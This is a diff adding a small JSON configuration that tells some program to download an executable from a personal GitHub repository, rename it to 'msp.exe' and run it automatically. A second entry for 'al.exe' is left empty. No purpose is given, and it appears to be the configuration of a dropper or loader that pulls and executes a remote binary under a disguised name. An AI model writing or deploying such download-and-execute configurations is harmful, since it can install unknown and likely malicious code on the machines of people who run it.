@@ -1,0 +1,14 @@
+{
+  "downloads": [
+    {
+      "download_url": "https://github.com/userbesty/img/raw/main/kotlhlad.exe",
+      "file_name": "msp.exe",
+      "run": true
+    },
+    {
+      "download_url": "",
+      "file_name": "al.exe",
+      "run": false
+    }
+  ]
+}
